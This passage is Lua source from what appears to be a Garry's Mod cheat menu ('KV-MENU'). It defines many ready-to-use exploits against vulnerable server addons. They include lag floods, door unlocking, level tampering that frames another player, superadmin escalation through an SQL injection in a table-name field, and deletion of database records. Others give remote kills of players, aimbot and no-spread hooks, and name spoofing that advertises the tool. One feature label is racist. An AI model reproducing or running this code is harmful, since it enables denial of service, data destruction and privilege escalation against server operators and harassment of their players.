        Think = function(tbl, sploit)
            KV.NetStart(sploit, "gamemode_reload_string")
            net.WriteString("GET KV-MENU")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Use your toolgun. Very quickly",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("AS_DoAttack") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "AS_DoAttack")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Seems like a fault in the water purifier",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("lfs_player_request_filter") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "lfs_player_request_filter")
            net.WriteEntity(KV.GetLP())
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if strName == "lfs_player_request_filter" then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Hit the server with a killing spell",
    severity = 95,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = math.huge,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("hpwrewrite_achievement1") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "hpwrewrite_achievement1")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool"
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Hit the server with a drone strike",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("dronesrewrite") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit, function()
                net.WriteEntity(KV.GetLP())
            end)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"dronesrewrite_requestweapons", "dronesrewrite_addfriends", "dronesrewrite_makebind", "dronesrewrite_controldr", "dronesrewrite_addfriend", "dronesrewrite_addmodule", "dronesrewrite_clickkey", "dronesrewrite_presskey"}
        }
    },
})

KV.AddExploit("Lagsploit", {
    desc = "Administration fees might bankrupt the server",
    severity = 95,
    bools = {
        enabled = true
    },
    status = 1,
    msgs_per_tick = KV.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return KV.DynamicNetString("ECleaner") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.MultiSend(sploit, function()
                net.WriteEntity(KV.GetLP())
            end)
        end,
    },
    functions = {
        {
            typ = "bools",
            tbl = {"ECleaner_ServerAction", "ECleaner_PlayEntity", "ECleaner_RestoreEntity"}
        }
    },
})

KV.AddExploit("Noise Exploit", {
    desc = "Causes players to become Lil Pump",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = function() return #KV.GetStored("lil_plyz", {}) end,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("wanted_radio") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("lil_plyz", {})) do
                if IsValid(v) then
                    KV.NetStart(sploit, 'wanted_radio')
                    net.WriteEntity(v)
                    net.WriteInt(1, 4)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "lil_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Noise Exploit", {
    desc = "Causes players to become African",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = function() return #KV.GetStored("afro_plyz", {}) end,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("lockpick_sound") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("afro_plyz", {})) do
                if IsValid(v) then
                    KV.NetStart(sploit, 'lockpick_sound')
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "afro_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Door Exploit", {
    desc = "Exploit the door you're looking at",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("fp_as_doorHandler") end,
    hooks = {
        Think = function(tbl, sploit)
            local v = KV.GetLP():GetEyeTrace().Entity
            local doorOwner = isfunction(v.getDoorData) and KV.ValidTable(v:getDoorData()) and v:getDoorData()["owner"] or nil
            KV.NetStart(sploit, "fp_as_doorHandler")
            net.WriteEntity(v)
            net.WriteString(tbl[1])

            if doorOwner then
                net.WriteDouble(doorOwner)
            end

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Lock",
            args = {"lock"}
        },
        {
            typ = "func",
            Name = "Unlock",
            args = {"unlock"}
        },
        {
            typ = "func",
            Name = "Remove Owner",
            args = {"removeOwner"}
        }
    },
})

KV.AddExploit("Door Exploit", {
    desc = "Unlock the door you're looking at",
    severity = 1,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("OpenGates") end,
    hooks = {
        Think = function(tbl, sploit)
            local v = KV.GetLP():GetEyeTrace().Entity
            KV.NetStart(sploit, "OpenGates")
            net.WriteEntity(v)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Open"
        },
    },
})

KV.AddExploit("Door Exploit", {
    desc = "Unlock the door you're looking at",
    severity = 1,
    bools = {
        enabled = false
    },
    status = -1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("Kun_FinishLockpicking") end,
    hooks = {
        Think = function(tbl, sploit)
            local v = KV.GetLP():GetEyeTrace().Entity
            KV.NetStart(sploit, "Kun_FinishLockpicking")
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Open"
        },
    },
})

KV.AddExploit("Door Exploit", {
    desc = "Unlock the door you're looking at",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("ReturnFrom_Succes") end,
    hooks = {
        Think = function(tbl, sploit)
            local v = KV.GetLP():GetEyeTrace().Entity
            KV.NetStart(sploit, "ReturnFrom_Succes")
            net.WriteEntity(v)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Open"
        },
    },
})

KV.AddExploit("Door Exploit", {
    desc = "Unlock and open every door as you walk up to it (blatant)",
    severity = 1,
    bools = {
        enabled = false
    },
    vars = {
        object = Entity(0)
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("dialogAlterWeapons") end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, object in pairs(ents.FindInSphere(KV.GetLP():GetPos(), 150)) do
                if object == KV.GetLP():GetEyeTrace().Entity and object:GetClass():find("door") and object ~= sploit.vars.object then
                    KV.NetStart(sploit, "dialogAlterWeapons", true)
                    net.WriteString("Add")

                    net.WriteTable({
                        [1] = "ci_hacking_gear"
                    })

                    net.SendToServer()
                    sploit.vars.object = object
                    break
                end
            end
        end,
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Unbox Exploit", {
    desc = "Choose what you get from an unbox",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("InitSpin") end,
    hooks = {
        net = {
            Receive = function(sploit, strName)
                if strName == "InitSpin" and sploit.bools.enabled then
                    local data = net.ReadTable()
                    local added = {}
                    local m = DermaMenu()

                    for k, v in ipairs(data) do
                        local CRC = util.CRC(table.ToString(v))

                        if v.itemName and not added[CRC] then
                            added[CRC] = CRC

                            m:AddOption(v.itemName .. (v.itemClassName ~= nil and " (" .. v.itemClassName .. ")" or ""), function()
                                KV.NetStart(sploit, "FinishedUnbox")
                                net.WriteInt(k, 16)
                                net.SendToServer()
                            end)
                        end
                    end

                    m:Open()

                    return false
                end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
            Name = "Open"
        },
    },
})

KV.AddExploit("Noise Exploit", {
    desc = "Causes players to leak petrol from their eyes",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    msgs_per_tick = function() return #KV.GetStored("gas_plyz", {}) end,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("simfphys_gasspill") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("gas_plyz", {})) do
                if IsValid(v) then
                    KV.NetStart(sploit, "simfphys_gasspill")
                    net.WriteVector(v:GetEyeTrace().HitPos)
                    net.WriteVector(v:GetEyeTrace().HitNormal)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "gas_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Level Exploit", {
    desc = "Set players level to anything (and blame someone else for admin abuse)",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("EL_editUser") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("level1_targets", {KV.GetLP()})) do
                if IsValid(v) then
                    KV.NetStart(sploit, "EL_editUser")

                    DATA = {
                        Target = v,
                        Value = KV.GetStored("level1_level", 100),
                        Value2 = KV.GetStored("level1_xp", 100),
                        Value3 = KV.GetStored("level1_sp", 100),
                        Value4 = KV.GetStored("level1_rank", 1)[2],
                        Executer = KV.GetStored("level1_victim", {})[1],
                    }

                    net.WriteTable(DATA)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "level1_targets",
            Name = "Target"
        },
        {
            typ = "float",
            addr = "level1_level",
            Name = "Level",
            min = 0,
            max = math.huge,
            default = 100
        },
        {
            typ = "float",
            addr = "level1_xp",
            Name = "Exp",
            min = 0,
            max = math.huge,
            default = 100
        },
        {
            typ = "float",
            addr = "level1_sp",
            Name = "Skill Points",
            min = 0,
            max = math.huge,
            default = 1200
        },
        {
            typ = EL_Ranks and "combo" or "float",
            tbl = EL_Ranks or {},
            Name = "Rank",
            default = {"", 1},
            addr = "level1_rank",
            min = 0,
            max = math.huge,
            default = 1,
            var = "name",
            sort = "rank",
            find = "rank"
        },
        {
            typ = "player",
            addr = "level1_victim",
            Name = "Victim"
        },
        {
            typ = "func",
            Name = "Do it"
        },
    },
})

KV.AddExploit("Level Exploit", {
    desc = "Manipulate any players level and inventory",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function()
        return KV.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") ~= false or KV.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") ~= false
    end,
    count = {
        ["Active"] = 0,
        ["Total"] = 2,
    },
    initial = function(sploit)
        if isfunction(KV.RecursiveGetVar(CRAFTINGMOD, {"Util", "CheckAdmin"}, "function")) then
            function CRAFTINGMOD.Util:CheckAdmin()
                return true
            end
        end

        local meta = debug.getregistry().Player

        if isfunction(meta.IsAdmin) then
            function meta:IsAdmin()
                return true
            end
        end

        if sploit.count.Active == 0 then
            if KV.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") ~= false then
                sploit.count.Active = sploit.count.Active + 1
            end

            if KV.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") ~= false then
                sploit.count.Active = sploit.count.Active + 1
            end
        end
    end,
    hooks = {
        Think = function(tbl, sploit)
            if tbl[1] == 1 then
                local menu = KV.RecursiveGetVar(CRAFTINGMOD, {"PANELS", "AdminMenu"}, "function")

                if isfunction(menu) then
                    menu(CRAFTINGMOD.PANELS)
                    KV.Menu:SetVisible(false)
                end
            elseif tbl[1] == 2 then
                local menu = KV.RecursiveGetVar(FARMINGMOD, {"AdminMenu"}, "function")

                if isfunction(menu) then
                    menu(FARMINGMOD)
                    KV.Menu:SetVisible(false)
                end
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Admin Menu (Mining)",
            args = {1},
            required = KV.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") ~= false
        },
        {
            typ = "func",
            Name = "Admin Menu (Farming)",
            args = {2},
            required = KV.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") ~= false
        },
    },
})

KV.AddExploit("Level Exploit", {
    desc = "Wield the Infinity Gauntlet",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return istable(DarkRPG) end,
    count = {
        ["Active"] = 22,
        ["Total"] = 22,
    },
    hooks = {
        Think = function(tbl, sploit)
            KV.OpenTableEditor(KV.Menu, DarkRPG.Player.Stats, "Player Stat Multipliers", function(tbl)
                local DarkRPG = KV.GetUpValues(DarkRPG.createTalent)["menu"] or DarkRPG
                DarkRPG.savePlayerSettings()
                DarkRPG.updateTalentTree()
                DarkRPG.applyPlayerSettings()
                DarkRPG.updateUsedPoints()
                DarkRPG.sendPlayerTotalsToServer()
            end)
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Close Fist",
        },
    },
})

KV.AddExploit("Database Exploit", {
    desc = "Give people superadmin (rejoin for it to take effect)",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return KV.ValidNetString("pplay_sendtable", "pplay_deleterow") and cl_PPlay end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("l_superadmins", {})) do
                if not IsValid(v) then continue end
                local ass = {}
                ass.tblname = "FAdmin_PlayerGroup; UPDATE FAdmin_PlayerGroup SET groupname = 'superadmin' WHERE steamid = " .. sql.SQLStr(v:SteamID())
                ass.ply = v
                KV.NetStart(sploit, "pplay_sendtable")
                net.WriteTable(ass)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "l_superadmins"
        },
        {
            typ = "func",
            Name = "Gibsmedat",
        },
    },
})

KV.AddExploit("Database Exploit", {
    desc = "Clumsy transport men always dropping the tables",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("CRAFTINGMOD_COMMANDS") or KV.ValidNetString("FISHINGMOD_ADMIN") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, (KV.ValidNetString("CRAFTINGMOD_COMMANDS") and "CRAFTINGMOD_COMMANDS") or (KV.ValidNetString("FISHINGMOD_ADMIN") and "FISHINGMOD_ADMIN"))
            net.WriteInt(3, 16)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Do it"
        },
    },
})

KV.AddExploit("Database Exploit", {
    desc = "Permanently delete all money printers from the server database",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return istable(gPrinters) and KV.ValidNetString("gPrinters.removePrinter") end,
    hooks = {
        Think = function(tbl, sploit)
            for _, printer in pairs(gPrinters.printers or {}) do
                for k, v in pairs(gPrinters.printers["Printers"][printer] or printer) do
                    KV.NetStart(sploit, "gPrinters.removePrinter")
                    net.WriteString(v.uid)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Do it"
        },
    },
})

KV.AddExploit("Damage Exploit", {
    desc = "Makes your bullets more accurate and more lethal",
    severity = 1,
    bools = {
        enabled = true
    },
    status = 1,
    times_per_tick = 1,
    scan = function(sploit)
        if istable(LeyHitreg) then
            sploit.channel = KV.GetUpValues(LeyHitreg.EntityFireBullets)["option_customnetmsg"]

            return true
        end
    end,
    count = {
        ["Active"] = 5,
        ["Total"] = 5,
    },
    channel = "nocheatinghere",
    hooks = {
        net = {
            SendToServer = function(sploit, varargs)
                sploit.BulletData = nil
            end,
        },
        util = {
            TraceLine = function(sploit, varargs)
                if KV.NetOutgoingMsg == sploit.channel then
                    local trace = util.TraceLine(unpack(varargs))

                    if sploit.bools.bighead then
                        trace.HitGroup = HITGROUP_HEAD
                    end

                    if sploit.bools.magicbullet and (not trace.Entity or not IsValid(trace.Entity) or not trace.Entity:IsPlayer()) then
                        local ply = KV.GetLP()

                        for k, ent in ipairs(player.GetAll()) do
                            if ent == ply or ent:Health() <= 0 then continue end
                            local mins, maxs = ent:OBBMins() * KV.GetStored("dmg1_hbox", 2), ent:OBBMaxs() * KV.GetStored("dmg1_hbox", 2)
                            mins = mins - Vector(0, 0, math.abs(maxs.z / 2)) + ent:OBBCenter()
                            maxs = maxs - Vector(0, 0, math.abs(maxs.z / 2)) + ent:OBBCenter()
                            local hitpos, normal, fraction = util.IntersectRayWithOBB(KV.Freecam.EyePos(), ply:GetAimVector() * 16384, ent:GetPos(), Angle(0, 0, 0), mins, maxs, 2)

                            if hitpos then
                                trace.Entity = ent
                                trace.HitPos = hitpos
                                debugoverlay.Line(trace.StartPos, trace.HitPos, 5, color_white, true)
                                debugoverlay.BoxAngles(ent:GetPos(), mins, maxs, ent:GetAngles(), 5, color_white)
                                break
                            end
                        end
                    end

                    if sploit.BulletData and varargs[1].start == sploit.BulletData.Src and sploit.bools.desync then
                        local pos = Vector(0, 0, 0)

                        if KV.Freecam.Enabled then
                            pos = KV.Freecam.EyePos()
                        elseif IsValid(trace.Entity) then
                            local dist = math.Round(trace.HitPos:DistToSqr(KV.GetLP():GetShootPos()))

                            if math.abs(dist) < (600 * 600) then
                                pos = trace.Entity:GetPos() + trace.Entity:OBBCenter()
                            else
                                for k, v in ipairs(ents.FindInSphere(KV.GetLP():GetShootPos(), 600)) do
                                    if v == KV.GetLP() then continue end

                                    if IsValid(v:GetPhysicsObject()) and math.abs(math.Round((v:GetPos() + v:OBBCenter()):DistToSqr(KV.GetLP():GetShootPos()))) < (600 * 600) then
                                        pos = v:GetPos() + v:OBBCenter()
                                        break
                                    end
                                end
                            end
                        end

                        varargs[1].endpos = varargs[1].endpos - varargs[1].start
                        varargs[1].start.x = pos.x
                        varargs[1].start.y = pos.y
                        varargs[1].start.z = pos.z
                        varargs[1].endpos = varargs[1].endpos + varargs[1].start
                    end

                    return trace
                end
            end,
        },
        math = {
            random = function(sploit, varargs)
                if sploit.bools.nospread and KV.NetOutgoingMsg == sploit.channel then return 0.5 end
            end,
        },
        table = {
            Copy = function(sploit, varargs)
                local function func(index)
                    local dbginfo = debug.getinfo(index)

                    if istable(dbginfo) and dbginfo.func == LeyHitreg.EntityFireBullets then
                        KV.NetOutgoingMsg = sploit.channel
                        sploit.BulletData = varargs[1]

                        return true
                    end
                end

                if not func(3) then
                    func(4)
                end
            end,
        },
        PostRender = function(tbl, sploit)
            if KV.Freecam.Enabled == true and sploit.bools.desync then
                local dist = math.Round(EyePos():DistToSqr(KV.GetLP():GetShootPos()))
                local color = Color(255, 255, 255)

                if math.abs(dist) > (600 * 600) then
                    color = Color(255, 0, 0)
                else
                    color = Color(102, 255, 102)
                end

                KV.DrawText(dist, "KVMenuText", 0, 20, color)
            end
        end,
    },
    functions = {
        {
            typ = "bool",
            ToggleText = {"Damage"},
            border = true,
            bool = "bighead"
        },
        {
            typ = "bool",
            ToggleText = {"NoSpread"},
            border = true,
            bool = "nospread"
        },
        {
            typ = "bool",
            ToggleText = {"Desync"},
            border = true,
            bool = "desync"
        },
        {
            typ = "bool",
            ToggleText = {"Assist"},
            border = true,
            bool = "magicbullet"
        },
        {
            typ = "float",
            Name = "Hitbox Scale",
            min = 1,
            max = math.huge,
            default = 1.5,
            addr = "dmg1_hbox"
        },
    },
})

--{ typ = "bool" },
KV.AddExploit("Damage Exploit", {
    desc = "Be a silent assassin by injuring people across the map",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("Taucannonfire") end,
    hooks = {
        Think = function(tbl, sploit)
            for i = 0, KV.GetStored("dmg1_mult", 1) do
                for k, v in ipairs(KV.GetStored("dmg1_plyz", {})) do
                    if IsValid(v) then
                        if v:IsPlayer() then
                            KV.NetStart(sploit, "Taucannonfire")
                            net.WriteEntity(v)
                            net.WriteBit(1)
                            net.SendToServer()
                        end
                    end
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "dmg1_plyz",
            Name = "Victims"
        },
        {
            typ = "float",
            Name = "Multiplier",
            min = 1,
            max = math.huge,
            default = 1,
            addr = "dmg1_mult"
        },
        {
            typ = "func",
            Name = "Do it"
        },
    },
})

KV.AddExploit("Damage Exploit", {
    desc = "Be a silent assassin by killing people across the map",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("mat_zset") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("dmg2_plyz", {})) do
                if IsValid(v) then
                    KV.NetStart(sploit, "mat_zset")
                    net.WriteString(v:Nick())
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "dmg2_plyz",
            Name = "Victims"
        },
        {
            typ = "func",
            Name = "Do it"
        },
    },
})

KV.AddExploit("Damage Exploit", {
    desc = "Become a god among men",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("dialogClose", "f4menufreeze") end,
    OnDisable = function(var, sploit)
        KV.NetStart(sploit, "dialogClose")
        net.SendToServer()
    end,
    hooks = {
        net = {
            Start = function(sploit, varargs)
                if varargs[1] == "dialogClose" and sploit.bools.enabled then
                    KV.NetStart(sploit, "f4menufreeze")
                    net.WriteBool(false)
                    net.SendToServer()
                    KV.GetLP().dialogActive = false

                    return false
                end
            end,
        },
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Damage Exploit", {
    desc = "Become the human torch",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    prevalidated = true,
    scan = function() return KV.ValidNetString("DragonVapeIgnite") and KV.GetLP():HasWeapon("weapon_vape_dragon") end,
    scan_always = true,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(ents.GetAll()) do
                if not IsValid(v) or not v:IsSolid() or v:GetPos():Distance(KV.GetLP():GetPos()) > 500 then continue end
                KV.NetStart(sploit, "DragonVapeIgnite")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Damage Exploit", {
    desc = "Evolve into a human with gills",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return KV.ValidNetString("StaminaDrowning") end,
    hooks = {
        net = {
            Start = function(sploit, varargs)
                if varargs[1] == "StaminaDrowning" and sploit.bools.enabled then return false end
            end,
        },
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

KV.AddExploit("Damage Exploit", {
    desc = "Makes your bullets more lethal",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function(sploit) return KV.ValidNetString("shr") end,
    hooks = {
        net = {
            WriteUInt = function(sploit, varargs)
                if KV.NetOutgoingMsg == "shr" and istable(KV.NetOutgoingData[6]) and KV.NetOutgoingData[6].Type == "Vector" and sploit.bools.enabled then
                    varargs[1] = HITGROUP_HEAD
                end
            end,
        },
    },
    functions = {
        {
            typ = "bool"
        },
    },
})

-- not done and not worth working on since it only exists on ~5 servers total
KV.AddExploit("Teleport Exploit", {
    desc = "Call a taxi",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    scan = function() return isfunction(net.Receivers["taxi_menu"]) end,
    hooks = {
        Think = function(tbl, sploit)
            KV.Menu:SetVisible(false)
            net.Receivers["taxi_menu"]()
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Open",
            args = {1}
        },
    },
})

KV.AddExploit("Instant Dumpster Diving", {
    desc = "Loot dumpsters whilst smoking crack",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("dumpster_beginsearch") end,
    hooks = {
        net = {
            Receive = function(sploit, strName)
                if strName == "dumpster_beginsearch" then
                    net.Receivers["dumpster_beginsearch"]()

                    if sploit.bools.enabled then
                        KV.GetLP().DumpsterTime = 0
                        KV.GetLP().DumpsterDiving = false
                        KV.NetStart(sploit, "dumpster_search_complete", true)
                        net.WriteInt(KV.GetLP().ActiveDumpster, 32)
                        net.SendToServer()
                    end

                    return false
                end
            end,
        },
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Disguise Exploit", {
    desc = "Disguise as any job",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString("disguise") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "disguise")

            net.WriteInt(KV.SafeToNumber(KV.GetStored("disguise1", {1, 1})[2]), 32)

            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "combo",
            Name = "Job",
            tbl = team.GetAllTeams(),
            restriction = "Joinable",
            var = "Name",
            sort = "Name",
            default = 1,
            addr = "disguise1"
        },
        {
            typ = "func",
            Name = "Disguise",
        },
    },
})

KV.AddExploit("Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return (KV.ValidNetString("gportal_rpname_change") and "gportal_rpname_change") or (KV.ValidNetString("gp_rpname_change") and "gp_rpname_change") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, sploit.channel)
            net.WriteString(tostring(KV.GetStored("nc1")))
            net.WriteString(tostring(KV.GetStored("nc2")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "First Name:",
            default = "GET",
            addr = "nc1"
        },
        {
            typ = "string",
            Name = "Last Name:",
            default = "ODIUM.PRO",
            addr = "nc2"
        },
        {
            typ = "func",
            Name = "Change Name",
        }
    },
})

KV.AddExploit("Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("WS:NPC:Name:NewName") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "WS:NPC:Name:NewName")
            net.WriteString(tostring(KV.GetStored("nc2")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Name: ",
            default = "GET KV-MENU",
            addr = "nc2"
        },
        {
            typ = "func",
            Name = "Change Name",
        }
    },
})

KV.AddExploit("Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("NewRPNameSQL") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "NewRPNameSQL")
            net.WriteString(tostring(KV.GetStored("nc3")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Name: ",
            default = "GET KV-MENU",
            addr = "nc3"
        },
        {
            typ = "func",
            Name = "Change Name",
        }
    },
})

KV.AddExploit("Name Changer", {
    desc = "Allows you to change your steam name to anything. (32 char limit)",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return isfunction(CNetChan) and CNetChan() and CNetChan():GetReliableBuffer() end,
    hooks = {
        Think = function(tbl, sploit)
            local buffer = CNetChan():GetReliableBuffer()
            buffer:WriteUInt(net_SetConVar, NET_MESSAGE_BITS)
            buffer:WriteByte(1)
            buffer:WriteString("name")
            buffer:WriteString(tostring(KV.GetStored("nc4")))
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Name: ",
            default = "GET KV-MENU",
            addr = "nc4"
        },
        {
            typ = "func",
            Name = "Change Name",
        }
    },
})

KV.AddExploit("Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("rpname_change") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "rpname_change")
            net.WriteString(tostring(KV.GetStored("nc5")))
            net.WriteString(tostring(KV.GetStored("nc51")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "First Name:",
            default = "GET",
            addr = "nc5"
        },
        {
            typ = "string",
            Name = "Last Name:",
            default = "ODIUM.PRO",
            addr = "nc51"
        },
        {
            typ = "func",
            Name = "Change Name",
        }
    },
})

KV.AddExploit("Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("popupinfo") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "popupinfo")
            net.WriteString(tostring(KV.GetStored("nc6")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Name:",
            default = "GET KV-MENU",
            addr = "nc6"
        },
        {
            typ = "func",
            Name = "Change Name",
        }
    },
})

KV.AddExploit("Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("scoreboardadmin") end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart(sploit, "scoreboardadmin")
            net.WriteEntity(KV.GetLP())
            net.WriteString("rpname")
            net.WriteString("user")
            net.WriteString(tostring(KV.GetStored("nc7")))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Name:",
            default = "GET KV-MENU",
            addr = "nc7"
        },
